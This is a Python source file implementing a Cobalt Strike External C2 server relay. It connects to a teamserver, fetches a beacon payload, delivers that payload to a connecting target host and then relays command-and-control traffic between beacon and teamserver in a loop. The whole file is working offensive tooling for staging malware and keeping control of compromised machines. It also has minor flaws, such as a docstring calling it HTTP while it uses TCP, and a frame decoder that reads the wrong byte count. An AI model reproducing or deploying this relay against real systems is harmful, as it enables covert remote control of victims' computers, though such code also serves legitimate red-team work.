"""
    server.py
    by Daniel Fitzgerald
    Sept 2021

    Program to provide HTTP file communications for Cobalt Strike using the External C2 feature.
"""
import argparse
import base64
import ipaddress
import socket
import struct
import sys
import time


class TCPinfo:
    """
    @brief Class to hold info for TCP session
    """
    def __init__(self, ts_ip, ts_port, srv_ip, srv_port, pipe_str):
        """

        :param ts_ip: IP address of CS Teamserver
        :param ts_port: Port of CS Teamserver
        :param srv_ip: IP to bind to on server
        :param srv_port: Port of server to listen on
        :param pipe_str: String for named pipe on client
        """
        self.ts_ip = ts_ip
        self.ts_port = ts_port
        self.srv_ip = srv_ip
        self.srv_port = srv_port
        self.pipe_str = pipe_str
        

class ExternalC2Controller:
    def __init__(self, port):
        self.port = port

    def encode_frame(self, data):
        """
        
        :param data: data to encode in frame
        :return: data packed in a CS external C2 frame
        """
        return struct.pack("<I", len(data)) + data

    def decode_frame(self, data):
        """
        
        :param data: frame to decode
        :return: length of data and data from frame
        """
        len = struct.unpack("<I", data[0:3])
        body = data[4:]
        return len, body
    
    def base64(self, msg):
        """

        :param msg: String to encode in Base64
        :return: Base64 encoded string (in bytes)
        """
        b64msg = base64.b64encode(msg)
        return b64msg

    def debase64(self, b64msg):
        """

        :param b64msg: Base64 string to be decoded
        :return: Decoded string
        """
        msg = base64.b64decode(b64msg)
        return msg
    
    def equalcheck(self, b64msg):
        """

        :param b64msg: Base64 string
        :return: Base64 string with == at end of it
        """
        # TODO: Find a better way of checking for end of B64 message
        equalbytes = "=".encode()
        equalequalbytes = "==".encode()
        if b64msg.find(equalequalbytes) != -1:
            return b64msg
        elif b64msg.find(equalbytes) != -1:
            b64msg += equalbytes
            return b64msg
        else:
            b64msg += equalequalbytes
            return b64msg

    def send_to_ts(self, data):
        """
        
        :param data: data to send to team server in the form of a CS External C2 frame
        """
        self._socketTS.sendall(self.encode_frame(data))

    def recv_from_ts(self):
        """
        
        :return: data received from team server in the form of a CS External C2 frame
        """
        data = bytearray()
        _len = self._socketTS.recv(4)
        l = struct.unpack("<I", _len)[0]
        while len(data) < l:
            data += self._socketTS.recv(l - len(data))
        return data

    def sendToBeacon(self, tcpinfo, data):
        """
        
        :param tcpinfo: Class with user tcp info
        :param data: Data to send to beacon
        """
        frame = self.encode_frame(data)
        self._socketBeacon.sendall(frame)


    def recvFromBeacon(self, tcpinfo):
        """

        :param tcpinfo: Class with user TCP info
        :return: data received from beacon
        """
        try:
            data_length = self._socketBeacon.recv(4)
        except:
            print("Recv failed.")
            return None
        data = self._socketBeacon.recv(4096)
        return data


    def run(self, tcpinfo):
        """

        :param tcpinfo: Class with user TCP info
        """
        # Connecting to TS first
        self._socketTS = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_IP)
        try:
            self._socketTS.connect((tcpinfo.ts_ip, tcpinfo.ts_port))
        except:
            print("Teamserver connection failed. Exiting.")
            return
        
        # Send out config options
        self.send_to_ts("arch=x86".encode())
        self.send_to_ts("pipename={}".format(tcpinfo.pipe_str).encode())
        self.send_to_ts("block=500".encode())
        self.send_to_ts("go".encode())

        # Receive the beacon payload from CS to forward to our target
        data = self.recv_from_ts()

        # Now that we have our beacon to send, wait for a connection from our target
        self._socketServer = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._socketServer.bind((tcpinfo.srv_ip,tcpinfo.srv_port))
        self._socketServer.listen()
        self._socketBeacon, beacon_addr = self._socketServer.accept()
        print("Connected to : {}".format(beacon_addr))

        # Send beacon payload to target
        self.sendToBeacon(tcpinfo, data)

        while True:
            data = self.recvFromBeacon(tcpinfo)
            if data == None:
                print("Error/exit from beacon")
                break
            print("Received %d bytes from beacon" % len(data))

            print("Sending %d bytes to TS" % len(data))
            self.send_to_ts(data)

            data = self.recv_from_ts()
            print("Received %d bytes from TS and sending to beacon" % len(data))
            self.sendToBeacon(tcpinfo, data)
        self._socketBeacon.close()
        self._socketServer.close()
        self._socketTS.close()


parser = argparse.ArgumentParser(description='Program to provide TCP communications for Cobalt Strike using the External C2 feature.',
                                 usage="\n"
                                       "%(prog)s [TS_IP] [SRV_IP] [SRV_PORT] [PIPE_STR]"
                                       "\nUse '%(prog)s -h' for more information.")
parser.add_argument('ts_ip', help="IP of teamserver (or redirector).")
parser.add_argument('srv_ip', help="IP to bind to on server.")
parser.add_argument('srv_port', type=int, help="Port number to bind to on server.")
parser.add_argument('pipe_str', help="String to name the pipe to the beacon. It must be the same as the client.")
parser.add_argument('--teamserver_port', '-tp', default=2222, type=int, help="Customize the port used to connect to the teamserver. Default is 2222.")
args = parser.parse_args()
controller = ExternalC2Controller(args.teamserver_port)
tcpinfo = TCPinfo(args.ts_ip, args.teamserver_port, args.srv_ip, args.srv_port, args.pipe_str)
while True:
    controller.run(tcpinfo)
